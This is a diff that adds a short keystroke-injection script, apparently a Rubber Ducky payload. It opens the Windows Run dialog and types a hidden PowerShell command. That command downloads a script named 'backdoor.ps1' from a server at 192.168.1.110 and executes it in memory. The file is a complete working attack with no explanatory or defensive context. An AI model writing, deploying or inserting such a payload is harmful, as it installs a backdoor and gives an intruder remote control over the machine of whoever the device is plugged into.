@@ -1,0 +1,6 @@
+DELAY 100
+GUI r
+DELAY 100
+STRING powershell -w hidden IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.110:8080/backdoor.ps1')
+DELAY 300
+ENTER
